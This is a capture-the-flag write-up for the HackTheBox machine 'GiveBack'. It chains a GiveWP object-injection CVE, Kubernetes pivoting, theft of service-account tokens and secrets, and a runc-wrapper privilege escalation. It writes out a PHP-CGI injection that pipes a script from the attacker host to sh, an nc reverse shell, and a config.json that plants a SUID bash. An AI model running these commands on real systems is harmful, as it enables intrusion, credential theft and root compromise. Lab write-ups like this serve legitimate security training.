---
title: "GiveBack — HackTheBox"
date: 2026-02-21
type: writeup
summary: "GiveWP exploitation led through Kubernetes secrets to host access and a restricted runc wrapper escape."
tags:
  - wordpress
  - cve-2024-5932
  - kubernetes
  - php-cgi
  - container-escape
difficulty: medium
---

## Reconnaissance

### Port Scanning

Starting with an Nmap scan to identify open ports and services:

```bash
sudo nmap -sC -sV 10.129.242.171 -oN scan
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
|_  256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)
80/tcp open  http    nginx 1.28.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
|_http-server-header: nginx/1.28.0
|_http-generator: WordPress 6.8.1
```

**Key Findings:**

- SSH (22/tcp) - OpenSSH 8.9p1
- HTTP (80/tcp) - nginx 1.28.0 running WordPress 6.8.1
- `robots.txt` reveals `/wp-admin/` directory

### Web Enumeration

Checking `robots.txt`:

```http
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

Sitemap: http://giveback.htb/wp-sitemap.xml
```

The sitemap reveals the hostname `giveback.htb`. Adding it to `/etc/hosts`:

```bash
echo "10.129.242.171 giveback.htb" | sudo tee -a /etc/hosts
```

### WordPress Scanning

Since the target is running WordPress, we use WPScan:

```bash
wpscan --url http://giveback.htb
```

**Critical Finding:**

```
[+] give
 | Location: http://giveback.htb/wp-content/plugins/give/
 | Last Updated: 2025-12-08T20:09:00.000Z
 | [!] The version is out of date, the latest version is 4.13.2
 | Version: 3.14.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://giveback.htb/wp-content/plugins/give/assets/dist/css/give.css?ver=3.14.0
```

The GiveWP plugin version 3.14.0 is vulnerable to **CVE-2024-5932** (PHP Object Injection).

## Initial Foothold - WordPress Exploitation

### CVE-2024-5932: GiveWP Plugin Exploitation

After researching CVE-2024-5932, we found a public exploit on GitHub:

- https://github.com/autom4il/CVE-2024-5932

**Issue with the PoC:** The script had hardcoded proxy settings in the `build_headers()` function that needed to be removed.

**Fixed exploit usage:**

```bash
python3 CVE-2024-5932.py
```

Setting up a reverse shell listener with Penelope:

```bash
python penelope.py
```

**Shell obtained:**

```bash
I have no name!@beta-vino-wp-wordpress-7f6dd548bf-k2jgk:/opt/bitnami/wordpress/wp-admin$
```

The unusual hostname format (`beta-vino-wp-wordpress-7f6dd548bf-k2jgk`) indicates we're inside a **Kubernetes pod**.

## Kubernetes Pod Enumeration

### Confirming Kubernetes Environment

Checking `/etc/hosts` confirms we're in a Kubernetes cluster:

```bash
cat /etc/hosts
```

### Searching for Service Account Tokens

Attempting to find Kubernetes service account tokens:

```bash
find / -name token 2>/dev/null
ls /run/secrets
# ls: cannot access '/run/secrets': No such file or directory
```

**Observation:** This pod doesn't have a service account token, so we cannot interact with the Kubernetes API server from here. We need to find another pod.

### Network Reconnaissance

Since standard tools like `curl` and `ip` aren't available, we transfer them:

```bash
# On attacker machine
python3 -m http.server 8000

# On target pod
php -r 'file_put_contents("/tmp/curl", file_get_contents("http://10.10.14.143:8000/curl"));'
chmod +x /tmp/curl
```

**Current pod IP:** `10.42.1.249`

### Discovering Other Services

Examining environment variables reveals other services in the cluster:

```bash
env | grep -E "SERVICE|PORT"
```

**Key Services Identified:**

```
WP_NGINX_SERVICE_SERVICE_HOST=10.43.4.242
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
BETA_VINO_WP_WORDPRESS_SERVICE_HOST=10.43.61.204
BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
KUBERNETES_SERVICE_HOST=10.43.0.1
LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
```

**Notable discovery:** `LEGACY_INTRANET_SERVICE` running on `10.43.2.241:5000`

### Setting Up Network Pivoting

To easily access the internal Kubernetes network, we set up a tunnel using **ligolo-ng**:

**On attacker machine:**

```bash
sudo ./proxy -laddr 0.0.0.0:6969 -selfcert
```

**On target pod:**

```bash
./agent -connect 10.10.14.143:6969 -ignore-cert &
```

Now we can directly access internal Kubernetes services from our attacking machine.

## Lateral Movement - PHP-CGI Exploitation

### Discovering the Legacy Intranet Service

Accessing `http://10.43.2.241:5000` reveals several endpoints:

```html
<li><a href="/admin/">/admin/</a> — VPN Required</li>
<li><a href="/backups/">/backups/</a> — VPN Required</li>
<li><a href="/runbooks/">/runbooks/</a> — VPN Required</li>
<li><a href="/legacy-docs/">/legacy-docs/</a> — VPN Required</li>
<li><a href="/debug/">/debug/</a> — Disabled</li>
<li><a href="/cgi-bin/info">/cgi-bin/info</a> — CGI Diagnostics</li>
<li><a href="/cgi-bin/php-cgi">/cgi-bin/php-cgi</a> — PHP-CGI Handler</li>
<li><a href="/phpinfo.php">/phpinfo.php</a></li>
<li><a href="/robots.txt">/robots.txt</a> — Crawlers: Disallowed</li>
```

### Exploiting PHP-CGI

The `/cgi-bin/php-cgi` endpoint is particularly interesting. PHP-CGI has a history of vulnerabilities, most notably **CVE-2024-4577** (though that's primarily for Windows).

**Testing for RCE:**

```bash
curl http://10.43.2.241:5000/cgi-bin/php-cgi
# Output: OK
```

Testing command injection:

```bash
curl "http://10.43.2.241:5000/cgi-bin/php-cgi?-d+allow_url_include=1+-d+auto_prepend_file=php://input" \
  -X POST \
  -d "<?php echo system('pwd'); ?>"
# Output: [START][END]
```

The command is processed but output isn't reflected. We need to use a different approach.

### Getting a Reverse Shell

Creating a shell script on our machine:

```bash
echo -n "nc 10.10.14.143:6009 -e /bin/sh" > shell
python3 -m http.server 8000
```

Triggering the shell download and execution:

```bash
php -r '$c=stream_context_create(["http"=>["method"=>"POST","content"=>"curl 10.10.14.143:8000/shell|sh"]]); 
echo file_get_contents("http://10.43.2.241:5000/cgi-bin/php-cgi?-d+allow_url_include=1+-d+auto_prepend_file=php://input", false, $c);'
```

**Shell received from new pod:** `10.42.1.239`

```bash
/var/www/html/cgi-bin # whoami
root
```

We're root inside this new pod!

## Kubernetes API Access & Secret Extraction

### Finding the Service Account Token

This pod has a service account token:

```bash
ls /run/secrets/kubernetes.io/serviceaccount/
# ca.crt  namespace  token
```

**Important:** The pod restarts every few minutes, so we need to extract the token and certificate quickly.

### Extracting Credentials

Exfiltrating the necessary files to our attacking machine:

```bash
cat /run/secrets/kubernetes.io/serviceaccount/token
cat /run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /run/secrets/kubernetes.io/serviceaccount/namespace
```

Saving `ca.crt` on attacker machine:

```bash
cat > /tmp/ca.crt << 'EOF'
-----BEGIN CERTIFICATE-----
MIIBdzCCAR2gAwIBAgIBADAKBggqhkjOPQQDAjAjMSEwHwYDVQQDDBhrM3Mtc2Vy
dmVyLWNhQDE3MjY5Mjc3MjMwHhcNMjQwOTIxMTQwODQzWhcNMzQwOTE5MTQwODQz
WjAjMSEwHwYDVQQDDBhrM3Mtc2VydmVyLWNhQDE3MjY5Mjc3MjMwWTATBgcqhkjO
PQIBBggqhkjOPQMBBwNCAATWYWOnIUmDn8DGHOdKLjrOZ36gSUMVrnqqf6YJsvpk
9QbgzGNFzYcwDZxmZtJayTbUrFFjgSydDNGuW/AkEnQ+o0IwQDAOBgNVHQ8BAf8E
BAMCAqQwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUtCpVDbK3XnBv3N3BKuXy
Yd0zeicwCgYIKoZIzj0EAwIDSAAwRQIgOsFo4UipeXPiEXvlGH06fja8k46ytB45
cd0d39uShuQCIQDMgaSW8nrpMfNExuGLMZhcsVrUr5XXN8F5b/zYi5snkQ==
-----END CERTIFICATE-----
EOF
```

### Configuring kubectl

Setting up kubectl to communicate with the Kubernetes API server:

```bash
# Set cluster configuration
kubectl config set-cluster k3s-cluster \
  --server=https://10.43.0.1:443 \
  --certificate-authority=/tmp/ca.crt \
  --embed-certs=true

# Set credentials
TOKEN="<extracted_token>"
kubectl config set-credentials secret-reader --token=$TOKEN

# Set context
kubectl config set-context k3s-context \
  --cluster=k3s-cluster \
  --user=secret-reader \
  --namespace=default

# Use the context
kubectl config use-context k3s-context
```

### Checking Permissions

Verifying what we can access:

```bash
kubectl auth can-i --list
```

**Key permissions:**

```
Resources                                       Non-Resource URLs   Resource Names   Verbs
secrets                                         []                  []               [get list]
```

We have read access to secrets!

### Extracting Secrets

Listing all secrets:

```bash
kubectl get secrets
```

**Output:**

```
NAME                                  TYPE                 DATA   AGE
beta-vino-wp-mariadb                  Opaque               2      499d
beta-vino-wp-wordpress                Opaque               1      499d
sh.helm.release.v1.beta-vino-wp.v58   helm.sh/release.v1   1      157d
[...]
user-secret-babywyrm                  Opaque               1      3h13m
```

**Interesting secret:** `user-secret-babywyrm`

Extracting the secret:

```bash
kubectl get secret user-secret-babywyrm -o yaml
```

**Output:**

```yaml
apiVersion: v1
data:
  MASTERPASS: UFpudjUxcEpEckIxZ1NPOVVhZFVBeE5QTUZCM1NjQlg=
kind: Secret
metadata:
  name: user-secret-babywyrm
  namespace: default
type: Opaque
```

### Decoding the Password

```bash
echo "UFpudjUxcEpEckIxZ1NPOVVhZFVBeE5QTUZCM1NjQlg=" | base64 -d
# PZnv51pJDrB1gSO9UadUAxNPMFB3ScBX
```

## SSH Access as babywyrm

### Gaining User Access

Using the extracted credentials:

```bash
ssh babywyrm@10.129.242.171
# Password: PZnv51pJDrB1gSO9UadUAxNPMFB3ScBX
```

**Success!**

```bash
babywyrm@giveback:~$ cat user.txt
b4ee5667acdf3f68feff6a331944231b
```

## Privilege Escalation to Root

### Sudo Enumeration

Checking sudo privileges:

```bash
sudo -l
```

**Output:**

```
Matching Defaults entries for babywyrm on localhost:
    env_reset, mail_badpass, 
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
    use_pty, timestamp_timeout=0, timestamp_timeout=20

User babywyrm may run the following commands on localhost:
    (ALL) NOPASSWD: !ALL
    (ALL) /opt/debug
```

We can run `/opt/debug` as root with sudo.

### Analyzing /opt/debug

Testing the binary:

```bash
sudo /opt/debug help
# [sudo] password for babywyrm: 
# [*] Validating sudo privileges...
# [*] Sudo validation successful
# Please enter the administrative password:
```

It requires an administrative password. Trying the password found in `wp-config.php` from the WordPress pod: `sW5sp4spa3u7RLyetrekE4oS`

**Success!**

```bash
[*] Administrative password verified
[*] Processing command: help
Restricted runc Debug Wrapper

Usage:
  /opt/debug [flags] spec
  /opt/debug [flags] run <id>
  /opt/debug version | --version | -v

Flags:
  --log <file>
  --root <path>
  --debug
```

### Understanding the Binary

`/opt/debug` is a **restricted wrapper around runc** (a container runtime tool). It only allows three commands:

- `spec` - Generate a container specification
- `run` - Run a container
- `version` - Show version info

Testing the allowed commands:

```bash
sudo /opt/debug list
# Error: Command 'list' is not permitted. Only 'spec', 'run', and 'version' are allowed.
```

### Exploitation Strategy

**The Plan:**

1. Use `spec` to generate a container configuration file (`config.json`)
2. Modify the config to mount `/tmp` into the container
3. Run the container as root (via sudo)
4. Have the container create a SUID bash binary in `/tmp`
5. Execute the SUID bash to get root

**Why this works:**

- The container runs as root
- The container can mount host directories
- Files created by the root container are owned by root on the host
- SUID bit allows us to run bash with root privileges

### Step 1: Generate Container Spec

```bash
cd /tmp
mkdir exploit
cd exploit
sudo /opt/debug spec
# Password: sW5sp4spa3u7RLyetrekE4oS
```

This creates `config.json` in the current directory.

### Step 2: Modify config.json

The default `config.json` needs several modifications:

**Key changes needed:**

1. Add a mount to access host `/tmp`
2. Change `noNewPrivileges` from `true` to `false`
3. Change root filesystem from `readonly: true` to `readonly: false`
4. Modify the command to create a SUID bash
5. Add SETUID/SETGID capabilities

**Modified config.json:**

```json
{
  "ociVersion": "1.0.2-dev",
  "process": {
    "terminal": true,
    "user": {
      "uid": 0,
      "gid": 0
    },
    "args": [
      "/bin/sh",
      "-c",
      "cp /bin/bash /host/rootbash && chmod 4755 /host/rootbash"
    ],
    "env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "TERM=xterm"
    ],
    "cwd": "/",
    "capabilities": {
      "bounding": [
        "CAP_CHOWN",
        "CAP_DAC_OVERRIDE",
        "CAP_FSETID",
        "CAP_FOWNER",
        "CAP_MKNOD",
        "CAP_NET_RAW",
        "CAP_SETUID",
        "CAP_SETGID"
      ],
      "effective": [
        "CAP_CHOWN",
        "CAP_DAC_OVERRIDE",
        "CAP_FSETID",
        "CAP_FOWNER",
        "CAP_MKNOD",
        "CAP_NET_RAW",
        "CAP_SETUID",
        "CAP_SETGID"
      ],
      "inheritable": [],
      "permitted": [
        "CAP_CHOWN",
        "CAP_DAC_OVERRIDE",
        "CAP_FSETID",
        "CAP_FOWNER",
        "CAP_MKNOD",
        "CAP_NET_RAW",
        "CAP_SETUID",
        "CAP_SETGID"
      ],
      "ambient": []
    },
    "rlimits": [
      {
        "type": "RLIMIT_NOFILE",
        "hard": 1024,
        "soft": 1024
      }
    ],
    "noNewPrivileges": false
  },
  "root": {
    "path": "rootfs",
    "readonly": false
  },
  "hostname": "runc",
  "mounts": [
    {
      "destination": "/proc",
      "type": "proc",
      "source": "proc"
    },
    {
      "destination": "/dev",
      "type": "tmpfs",
      "source": "tmpfs",
      "options": [
        "nosuid",
        "strictatime",
        "mode=755",
        "size=65536k"
      ]
    },
    {
      "destination": "/dev/pts",
      "type": "devpts",
      "source": "devpts",
      "options": [
        "nosuid",
        "noexec",
        "newinstance",
        "ptmxmode=0666",
        "mode=0620",
        "gid=5"
      ]
    },
    {
      "destination": "/dev/shm",
      "type": "tmpfs",
      "source": "shm",
      "options": [
        "nosuid",
        "noexec",
        "nodev",
        "mode=1777",
        "size=65536k"
      ]
    },
    {
      "destination": "/dev/mqueue",
      "type": "mqueue",
      "source": "mqueue",
      "options": [
        "nosuid",
        "noexec",
        "nodev"
      ]
    },
    {
      "destination": "/sys",
      "type": "sysfs",
      "source": "sysfs",
      "options": [
        "nosuid",
        "noexec",
        "nodev",
        "ro"
      ]
    },
    {
      "destination": "/sys/fs/cgroup",
      "type": "cgroup",
      "source": "cgroup",
      "options": [
        "nosuid",
        "noexec",
        "nodev",
        "relatime",
        "ro"
      ]
    },
    {
      "destination": "/host",
      "type": "bind",
      "source": "/tmp",
      "options": [
        "rbind",
        "rw"
      ]
    }
  ],
  "linux": {
    "resources": {},
    "namespaces": [
      {
        "type": "pid"
      },
      {
        "type": "ipc"
      },
      {
        "type": "uts"
      },
      {
        "type": "mount"
      },
      {
        "type": "network"
      }
    ],
    "maskedPaths": [
      "/proc/acpi",
      "/proc/asound",
      "/proc/kcore",
      "/proc/keys",
      "/proc/latency_stats",
      "/proc/timer_list",
      "/proc/timer_stats",
      "/proc/sched_debug",
      "/sys/firmware",
      "/proc/scsi"
    ],
    "readonlyPaths": [],
    "maskPaths": [],
    "seccomp": null
  }
}
```

**Critical modifications explained:**

1. **Mount /tmp to /host inside container:**
    
    ```json
    {
      "destination": "/host",
      "type": "bind",
      "source": "/tmp",
      "options": ["rbind", "rw"]
    }
    ```
    
    - This makes the host's `/tmp` accessible at `/host` inside the container
    - We use `/tmp` instead of `/` to bypass the security check that blocks root filesystem mounts
2. **Command to create SUID bash:**
    
    ```json
    "args": [
      "/bin/sh",
      "-c",
      "cp /bin/bash /host/rootbash && chmod 4755 /host/rootbash"
    ]
    ```
    
    - Copies `/bin/bash` to `/host/rootbash` (which is `/tmp/rootbash` on the host)
    - Sets permissions to `4755` - the `4` sets the SUID bit
    - Since this runs as root, the file is owned by root
3. **Disable noNewPrivileges:**
    
    ```json
    "noNewPrivileges": false
    ```
    
    - Allows SUID binaries to escalate privileges
4. **Add SETUID/SETGID capabilities:**
    
    ```json
    "CAP_SETUID",
    "CAP_SETGID"
    ```
    
    - Required for the chmod operation to set SUID

### Step 3: Populate rootfs

The container needs binaries to execute. We need to create a minimal filesystem:

```bash
cd /tmp/exploit

mkdir -p rootfs/bin rootfs/lib rootfs/lib64 rootfs/lib/x86_64-linux-gnu

# essential binaries for the container cause it comes with no binaries 
cp /bin/bash rootfs/bin/
cp /bin/sh rootfs/bin/ 2>/dev/null || ln -s bash rootfs/bin/sh
cp /bin/cp rootfs/bin/
cp /bin/chmod rootfs/bin/

# Copy required libraries for bash
ldd /bin/bash | awk '{print $3}' | grep '^/' | while read lib; do
  cp "$lib" rootfs/lib/x86_64-linux-gnu/ 2>/dev/null || \
  cp "$lib" rootfs/lib64/ 2>/dev/null || \
  cp "$lib" rootfs/lib/
done

# Copy libraries for cp
ldd /bin/cp | awk '{print $3}' | grep '^/' | while read lib; do
  cp "$lib" rootfs/lib/x86_64-linux-gnu/ 2>/dev/null || \
  cp "$lib" rootfs/lib64/ 2>/dev/null || \
  cp "$lib" rootfs/lib/
done

# Copy libraries for chmod
ldd /bin/chmod | awk '{print $3}' | grep '^/' | while read lib; do
  cp "$lib" rootfs/lib/x86_64-linux-gnu/ 2>/dev/null || \
  cp "$lib" rootfs/lib64/ 2>/dev/null || \
  cp "$lib" rootfs/lib/
done

# Copy the dynamic linker
cp /lib64/ld-linux-x86-64.so.* rootfs/lib64/ 2>/dev/null
cp /lib/x86_64-linux-gnu/ld-linux-x86-64.so.* rootfs/lib/x86_64-linux-gnu/ 2>/dev/null
```

**Why we need this:**

- Containers are isolated - they don't have access to the host's `/bin` directory
- We need to provide the binaries (`bash`, `cp`, `chmod`) and their dependencies
- The `ldd` command shows which libraries each binary needs
- We copy all dependencies so the binaries can execute inside the container

### Step 4: Run the Container

```bash
sudo /opt/debug run pwned
# [sudo] password for babywyrm: <enter sudo password>
# Please enter the administrative password: sW5sp4spa3u7RLyetrekE4oS
```

The container runs, executes our command, and creates `/tmp/rootbash` as a SUID binary owned by root.

### Step 5: Execute SUID Bash for Root

```bash
/tmp/rootbash -p
```

The `-p` flag preserves the SUID privileges.

**Root shell obtained!**

```bash
rootbash-5.1# whoami
root
rootbash-5.1# cat /root/root.txt
<root_flag_here>
```

### How the Exploit Works - Technical Breakdown

**The Attack Chain:**

1. **Sudo Execution:** When we run `sudo /opt/debug run pwned`, the `/opt/debug` wrapper runs with root privileges
    
2. **Container Creation:** The wrapper calls `runc` (as root) to create a container based on our `config.json`
    
3. **Filesystem Mount:** Our config tells runc to bind-mount the host's `/tmp` directory to `/host` inside the container:
    
    - From the container's perspective: writing to `/host/`
    - On the host system: files appear in `/tmp/`
4. **SUID Binary Creation:** The container (running as root) executes:
    
    ```bash
    cp /bin/bash /host/rootbash && chmod 4755 /host/rootbash
    ```
    
    This creates `/tmp/rootbash` on the host, owned by root, with SUID bit set
    
5. **Privilege Escalation:** When we execute `/tmp/rootbash -p`:
    
    - The SUID bit makes bash run with the file owner's privileges (root)
    - The `-p` flag tells bash not to drop privileges
    - We get a root shell

**Why the security bypass worked:**

The `/opt/debug` wrapper had a security check to prevent mounting the root filesystem (`/`), but it didn't check for mounting subdirectories like `/tmp`. This allowed us to:

- Bypass the root filesystem mount detection
- Still gain access to a host directory
- Create files accessible from the host system

```bash
babywyrm@giveback:/tmp/exploit$ /tmp/rootbash  -p
rootbash-5.1# whoami
root
rootbash-5.1# cat /root/root.txt 
169cce1742f9b0ac566bb312f9b31168
```
